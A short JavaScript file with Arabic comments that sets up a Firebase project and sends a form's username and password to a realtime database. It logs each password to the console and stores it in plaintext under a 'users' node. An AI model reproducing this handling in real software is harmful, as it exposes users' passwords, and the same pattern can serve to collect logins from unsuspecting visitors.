// تهيئة Firebase باستخدام بيانات التكوين الخاصة بمشروعك
const firebaseConfig = {
    apiKey: "AIzaSyBl_my3_S4o1jl01fK9TZQdeDvGMadFw5c",
    authDomain: "website-2b8c6.firebaseapp.com",
    databaseURL: "https://website-2b8c6-default-rtdb.firebaseio.com",
    projectId: "website-2b8c6",
    storageBucket: "website-2b8c6.firebasestorage.app",
    messagingSenderId: "899708586775",
    appId: "1:899708586775:web:9ed322d7039346b4070552",
    measurementId: "G-7Q5P967MZV"
};

// تهيئة التطبيق
const app = firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// معالجة النموذج
document.getElementById('dataForm').addEventListener('submit', function(event) {
    event.preventDefault(); // منع إعادة تحميل الصفحة

    // الحصول على البيانات من النموذج
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    console.log("Username:", username);
    console.log("Password:", password);

    // التحقق من أن Firebase يعمل
    if (!firebase.apps.length) {
        console.error("Firebase not initialized!");
        alert("حدث خطأ: Firebase لم يتم تهيئته.");
        return;
    }

    // إرسال البيانات إلى Firebase
    const newEntryRef = database.ref('users').push();
    newEntryRef.set({
        username: username,
        password: password
    }).then(() => {
        console.log("Data saved successfully!");
        alert('تم حفظ البيانات بنجاح!');
    }).catch((error) => {
        console.error("حدث خطأ:", error);
        alert('حدث خطأ أثناء حفظ البيانات.');
    });
});
